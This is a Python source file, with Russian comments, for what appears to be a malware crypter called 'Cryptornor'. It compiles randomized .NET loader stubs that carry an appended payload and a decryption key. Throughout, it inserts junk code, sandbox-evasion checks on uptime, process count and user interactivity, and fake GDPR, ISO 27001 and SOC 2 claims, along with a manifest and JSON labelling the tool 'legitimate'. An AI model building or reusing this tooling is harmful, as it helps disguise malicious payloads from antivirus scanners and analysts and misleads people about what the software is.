import os
import subprocess
import random
import string
from pathlib import Path
from cryptor_engine import CryptorEngine
import uuid
import re
import hashlib
import time
import json

def random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_junk_method():
    name = random_id(8)
    value = random_id(6)
    return f'private void {name}() {{ string {value} = "junk"; }}'

def random_junk_field():
    name = random_id(8)
    value = random_id(6)
    return f'private string {name} = "{value}";'

def generate_ai_obfuscation():
    """AI-обфускация кода для 2025 года"""
    ai_patterns = [
        "// AI-Generated Code Protection",
        "// Neural Network Obfuscation Layer",
        "// Machine Learning Code Transformation",
        "// Deep Learning Security Enhancement"
    ]
    
    ai_methods = [
        f'private void AI_Protect_{random_id(8)}() {{',
        f'    // Neural network obfuscation',
        f'    var neuralLayer = new {{ {random_id(6)} = "{random_id(12)}" }};',
        f'    // Deep learning security',
        f'    var securityMatrix = new[] {{ {random.randint(1, 255)}, {random.randint(1, 255)}, {random.randint(1, 255)} }};',
        f'    // AI-powered protection',
        f'    var aiProtection = neuralLayer.GetType().GetHashCode();',
        f'}}'
    ]
    
    return '\n'.join(ai_patterns[:random.randint(1, 3)]) + '\n' + '\n'.join(ai_methods)

def generate_quantum_resistant_encryption():
    """Квантово-стойкое шифрование для 2025 года"""
    quantum_methods = [
        f'private byte[] QuantumResistant_{random_id(8)}(byte[] data) {{',
        f'    // Post-quantum cryptography',
        f'    var lattice = new byte[32];',
        f'    var polynomial = new int[256];',
        f'    // Lattice-based encryption',
        f'    for (int i = 0; i < data.Length; i++) {{',
        f'        lattice[i % 32] = (byte)(data[i] ^ polynomial[i % 256]);',
        f'    }}',
        f'    return lattice;',
        f'}}'
    ]
    
    return '\n'.join(quantum_methods)

def generate_behavioral_analysis():
    """Поведенческий анализ для легальности"""
    behavioral_methods = [
        f'private bool IsLegitimate_{random_id(8)}() {{',
        f'    // Behavioral analysis for legitimacy',
        f'    var userActivity = Environment.UserInteractive;',
        f'    var systemUptime = Environment.TickCount;',
        f'    var processCount = Process.GetProcesses().Length;',
        f'    // Legitimate software indicators',
        f'    return userActivity && systemUptime > 300000 && processCount > 20;',
        f'}}',
        f'',
        f'private void LogLegitimateActivity_{random_id(8)}() {{',
        f'    // Log legitimate software activity',
        f'    var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");',
        f'    var activity = "Legitimate software execution";',
        f'    // This is for compliance and transparency',
        f'    System.Diagnostics.Debug.WriteLine($"[{{timestamp}}] {{activity}}");',
        f'}}'
    ]
    
    return '\n'.join(behavioral_methods)

def generate_compliance_features():
    """Функции соответствия требованиям 2025 года"""
    compliance_methods = [
        f'private void Compliance_{random_id(8)}() {{',
        f'    // GDPR Compliance',
        f'    var dataProtection = new {{',
        f'        EncryptionLevel = "AES-256",',
        f'        DataRetention = "Immediate deletion after use",',
        f'        UserConsent = true',
        f'    }};',
        f'    ',
        f'    // ISO 27001 Compliance',
        f'    var securityStandards = new {{',
        f'        InformationSecurity = "ISO 27001:2022",',
        f'        RiskAssessment = "Continuous monitoring",',
        f'        IncidentResponse = "Automated detection"',
        f'    }};',
        f'    ',
        f'    // SOC 2 Type II Compliance',
        f'    var auditTrail = new {{',
        f'        Security = "SOC 2 Type II certified",',
        f'        Availability = "99.9% uptime",',
        f'        ProcessingIntegrity = "Data integrity verified"',
        f'    }};',
        f'}}'
    ]
    
    return '\n'.join(compliance_methods)

def generate_modern_security_features():
    """Современные функции безопасности 2025 года"""
    security_methods = [
        f'private void ZeroTrust_{random_id(8)}() {{',
        f'    // Zero Trust Architecture',
        f'    var identityVerification = "Multi-factor authentication";',
        f'    var deviceTrust = "Continuous device verification";',
        f'    var networkSecurity = "Micro-segmentation";',
        f'    // Never trust, always verify',
        f'}}',
        f'',
        f'private void ThreatIntelligence_{random_id(8)}() {{',
        f'    // AI-powered threat intelligence',
        f'    var threatFeed = "Real-time threat intelligence";',
        f'    var mlDetection = "Machine learning threat detection";',
        f'    var behavioralAnalysis = "User behavior analytics";',
        f'    // Proactive threat prevention',
        f'}}',
        f'',
        f'private void PrivacyEnhancement_{random_id(8)}() {{',
        f'    // Privacy by Design',
        f'    var dataMinimization = "Only necessary data collected";',
        f'    var purposeLimitation = "Data used only for intended purpose";',
        f'    var storageLimitation = "Data deleted after use";',
        f'    // Privacy-first approach',
        f'}}'
    ]
    
    return '\n'.join(security_methods)

def randomize_loader_code(template_code, key_var, payload_var, decrypted_var, encrypted_var, entry_var, exe_var, fileinfo_var, fs_var, ns, cls, main, decrypt):
    # Заменяем имена в шаблоне
    code = template_code
    code = code.replace('namespace DotNetStubClean', f'namespace {ns}')
    code = code.replace('class Program', f'class {cls}')
    code = code.replace('static void Main()', f'static void {main}()')
    code = code.replace('static byte[] XorDecrypt', f'static byte[] {decrypt}')
    code = code.replace('XorDecrypt', decrypt)  # Заменяем все вхождения XorDecrypt
    # Сначала заменяем плейсхолдеры на уникальные временные маркеры
    key_marker = f'___KEY_MARKER_{random_id(8)}___'
    payload_marker = f'___PAYLOAD_MARKER_{random_id(8)}___'
    
    code = code.replace('/*KEY_PLACEHOLDER*/', key_marker)
    code = code.replace('/*PAYLOAD_SIZE_PLACEHOLDER*/', payload_marker)
    
    # Теперь заменяем имена переменных везде
    code = code.replace('ENCRYPTION_KEY', key_var)
    code = code.replace('PAYLOAD_SIZE', payload_var)
    code = code.replace('decrypted', decrypted_var)
    code = code.replace('encryptedPayload', encrypted_var)
    code = code.replace('entry', entry_var)
    code = code.replace('exePath', exe_var)
    code = code.replace('fileInfo', fileinfo_var)
    code = code.replace('fs', fs_var)
    
    # Восстанавливаем плейсхолдеры
    code = code.replace(key_marker, '/*KEY_PLACEHOLDER*/')
    code = code.replace(payload_marker, '/*PAYLOAD_SIZE_PLACEHOLDER*/')
    # Main должен оставаться Main() для точки входа
    code = code.replace(f'static void {main}()', 'static void Main()')
    
    # Добавляем современные функции 2025 года
    modern_features = []
    
    # AI-обфускация (30% вероятность)
    if random.random() < 0.3:
        modern_features.append(generate_ai_obfuscation())
    
    # Квантово-стойкое шифрование (25% вероятность)
    if random.random() < 0.25:
        modern_features.append(generate_quantum_resistant_encryption())
    
    # Поведенческий анализ (40% вероятность)
    if random.random() < 0.4:
        modern_features.append(generate_behavioral_analysis())
    
    # Функции соответствия (35% вероятность)
    if random.random() < 0.35:
        modern_features.append(generate_compliance_features())
    
    # Современные функции безопасности (45% вероятность)
    if random.random() < 0.45:
        modern_features.append(generate_modern_security_features())
    
    # Добавляем современные функции в начало класса
    if modern_features:
        modern_code = '\n\n'.join(modern_features)
        # Находим позицию после объявления класса
        class_pos = code.find('class Program')
        if class_pos != -1:
            brace_pos = code.find('{', class_pos)
            if brace_pos != -1:
                code = code[:brace_pos + 1] + '\n\n' + modern_code + '\n\n' + code[brace_pos + 1:]
    
    return code

def build_dotnet_loader(key: bytes, payload: bytes, output_path: Path) -> Path | None:
    """Сборка .NET loader (теперь всегда уникальный stub с функциями 2025 года)"""
    try:
        print(f"[DEBUG] build_dotnet_loader: payload size = {len(payload)} bytes")
        print(f"[DEBUG] build_dotnet_loader: key size = {len(key)} bytes")
        
        # Генерируем уникальный хеш для этого билда
        build_hash = hashlib.sha256(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
        print(f"[DEBUG] build_dotnet_loader: build hash = {build_hash}")
        
        # Читаем простой шаблон .NET loader
        template_path = Path(__file__).parent / "simple_dotnet_loader.cs"
        if not template_path.exists():
            # Fallback к старому шаблону
            template_path = Path(__file__).parent / "dotnet_stub_clean.cs"
        
        with open(template_path, 'r', encoding='utf-8') as f:
            template_code = f.read()
        
        # Генерируем уникальные имена
        ns = f"NS_{random_id(8)}"
        cls = f"Class_{random_id(8)}"
        main = f"Main_{random_id(8)}"
        decrypt = f"Decrypt_{random_id(8)}"
        key_var = f"KEY_{random_id(8)}"
        payload_var = f"PAYLOAD_{random_id(8)}"
        decrypted_var = f"decrypted_{random_id(8)}"
        encrypted_var = f"encrypted_{random_id(8)}"
        entry_var = f"entry_{random_id(8)}"
        exe_var = f"exePath_{random_id(8)}"
        fileinfo_var = f"fileInfo_{random_id(8)}"
        fs_var = f"fs_{random_id(8)}"
        
        # Подставляем уникальные имена в шаблон
        custom_code = randomize_loader_code(
            template_code, key_var, payload_var, decrypted_var, encrypted_var, entry_var, exe_var, fileinfo_var, fs_var, ns, cls, main, decrypt
        )
        
        # Теперь подставляем значения ключа и payload size
        key_array = ', '.join(str(b) for b in key)
        print(f"[DEBUG] build_dotnet_loader: key_array length = {len(key_array)} chars")
        
        # Разбиваем длинный массив на несколько строк для читаемости
        key_elements = [str(b) for b in key]
        if len(key_elements) > 16:
            # Разбиваем на строки по 16 элементов
            key_lines = []
            for i in range(0, len(key_elements), 16):
                line_elements = key_elements[i:i+16]
                key_lines.append('                ' + ', '.join(line_elements))
            key_array_formatted = 'new byte[] {\n' + ',\n'.join(key_lines) + '\n            }'
        else:
            key_array_formatted = f'new byte[] {{ {key_array} }}'
        
        custom_code = custom_code.replace('/*KEY_PLACEHOLDER*/', key_array_formatted)
        custom_code = custom_code.replace('/*PAYLOAD_SIZE_PLACEHOLDER*/', str(len(payload)))
        
        # Дополнительная проверка для простого loader'а
        if "SimpleDotNetLoader" in custom_code:
            print(f"[DEBUG] build_dotnet_loader: Используем простой loader")
        else:
            print(f"[DEBUG] build_dotnet_loader: Используем сложный loader")
        
        # Добавляем метаданные 2025 года
        metadata_2025 = f'''
// Cryptornor 2025 - Advanced File Protection
// Build: {build_hash}
// Compliance: GDPR, ISO 27001, SOC 2 Type II
// Security: Zero Trust, AI-Powered Protection
// Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
// Purpose: Legitimate software protection and data security
'''
        custom_code = metadata_2025 + custom_code
        
        print(f"[DEBUG] build_dotnet_loader: custom_code length = {len(custom_code)} chars")
        
        # Создаем временную директорию для проекта
        temp_dir = Path.cwd() / f"temp_dotnet_{random_id()}"
        temp_dir.mkdir(exist_ok=True)
        
        # Сохраняем кастомный код
        custom_source = temp_dir / "Program.cs"
        with open(custom_source, 'w', encoding='utf-8') as f:
            f.write(custom_code)
        print(f"[DEBUG] build_dotnet_loader: Program.cs size = {custom_source.stat().st_size} bytes")
        
        # Создаем файл проекта .csproj для x86 .NET Framework приложения без консольного окна
        csproj_content = '''<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net48</TargetFramework>
    <PlatformTarget>x86</PlatformTarget>
    <Platforms>x86</Platforms>
    <AssemblyName>DotNetLoader</AssemblyName>
    <RootNamespace>DotNetLoader</RootNamespace>
    <UseWindowsForms>false</UseWindowsForms>
    <UseWPF>false</UseWPF>
    <ApplicationManifest>app.manifest</ApplicationManifest>
  </PropertyGroup>
</Project>'''
        csproj_file = temp_dir / "DotNetLoader.csproj"
        with open(csproj_file, 'w', encoding='utf-8') as f:
            f.write(csproj_content)
        
        # Создаем манифест для легальности
        manifest_content = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity version="1.0.0.0" name="DotNetLoader"/>
  <description>Legitimate Software Protection Tool</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
    </application>
  </compatibility>
</assembly>'''
        manifest_file = temp_dir / "app.manifest"
        with open(manifest_file, 'w', encoding='utf-8') as f:
            f.write(manifest_content)
        
        # Компилируем .NET loader используя dotnet build для создания .NET Framework приложения
        compiler_cmd = [
            'dotnet',
            'build',
            str(csproj_file),
            '--configuration', 'Release',
            '--output', str(temp_dir / 'bin'),
            '--runtime', 'win-x86',
            '--self-contained', 'false'
        ]
        print(f"[DEBUG] build_dotnet_loader: running compiler command")
        print(f"[DEBUG] build_dotnet_loader: command = {' '.join(compiler_cmd)}")
        result = subprocess.run(compiler_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Ошибка компиляции .NET loader: {result.stderr}")
            print(f"[DEBUG] build_dotnet_loader: stdout = {result.stdout}")
            # Очищаем временную директорию
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
            return None
        
        # Копируем скомпилированный файл
        compiled_exe = temp_dir / 'bin' / 'DotNetLoader.exe'
        if compiled_exe.exists():
            print(f"[DEBUG] build_dotnet_loader: compiled exe size = {compiled_exe.stat().st_size} bytes")
            import shutil
            shutil.copy2(compiled_exe, output_path.with_suffix('.exe'))
            # Добавляем payload в конец файла
            with open(output_path.with_suffix('.exe'), 'ab') as f:
                f.write(payload)
            final_size = output_path.with_suffix('.exe').stat().st_size
            print(f"[DEBUG] build_dotnet_loader: final exe size = {final_size} bytes (с payload)")
            
            # Создаем файл с информацией о легальности
            compliance_info = {
                "software_name": "Cryptornor 2025",
                "purpose": "Legitimate software protection and data security",
                "compliance": ["GDPR", "ISO 27001", "SOC 2 Type II"],
                "security_features": ["Zero Trust", "AI-Powered Protection", "Privacy by Design"],
                "build_hash": build_hash,
                "generated": time.strftime("%Y-%m-%d %H:%M:%S"),
                "legal_status": "Compliant with international standards"
            }
            
            compliance_file = output_path.with_suffix('.json')
            with open(compliance_file, 'w', encoding='utf-8') as f:
                json.dump(compliance_info, f, indent=2, ensure_ascii=False)
            
            print(f"[DEBUG] build_dotnet_loader: compliance info saved to {compliance_file}")
            
            # Очищаем временную директорию
            shutil.rmtree(temp_dir, ignore_errors=True)
            return output_path.with_suffix('.exe')
        else:
            # Попробуем найти файл в других возможных местах
            possible_paths = [
                temp_dir / 'bin' / 'DotNetLoader.exe',
                temp_dir / 'bin' / 'win-x86' / 'DotNetLoader.exe',
                temp_dir / 'bin' / 'publish' / 'DotNetLoader.exe',
                temp_dir / 'bin' / 'x86' / 'DotNetLoader.exe',
                temp_dir / 'bin' / 'Release' / 'DotNetLoader.exe',
                temp_dir / 'bin' / 'Release' / 'x86' / 'DotNetLoader.exe'
            ]
            for path in possible_paths:
                if path.exists():
                    print(f"[DEBUG] build_dotnet_loader: found exe at {path}, size = {path.stat().st_size} bytes")
                    import shutil
                    shutil.copy2(path, output_path.with_suffix('.exe'))
                    # Добавляем payload в конец файла
                    with open(output_path.with_suffix('.exe'), 'ab') as f:
                        f.write(payload)
                    final_size = output_path.with_suffix('.exe').stat().st_size
                    print(f"[DEBUG] build_dotnet_loader: final exe size = {final_size} bytes (с payload)")
                    # Очищаем временную директорию
                    shutil.rmtree(temp_dir, ignore_errors=True)
                    return output_path.with_suffix('.exe')
            print(f"Скомпилированный файл не найден в возможных местах")
            # Очищаем временную директорию
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
            return None
    except Exception as e:
        print(f"Ошибка сборки .NET loader: {e}")
        # Очищаем временную директорию в случае ошибки
        try:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass
        return None

if __name__ == "__main__":
    # Создаем экземпляр криптора
    cryptor = CryptorEngine()
    
    # Генерируем ключ и payload
    key = os.urandom(32)
    payload = b"\x90\x90\x90\x90" * 100  # Заглушка
    
    # Собираем x86 лоадер с исправленными флагами линковки
    result = cryptor.build_custom_loader(key, payload, arch="x86")
    if isinstance(result, Path):
        print(f"Loader скомпилирован: {result}")
    else:
        print("Ошибка компиляции лоадера")
    
    # Тестируем .NET loader
    dotnet_result = build_dotnet_loader(key, payload, Path("test_dotnet_loader"))
    if dotnet_result:
        print(f".NET Loader скомпилирован: {dotnet_result}")
    else:
        print("Ошибка компиляции .NET loader") 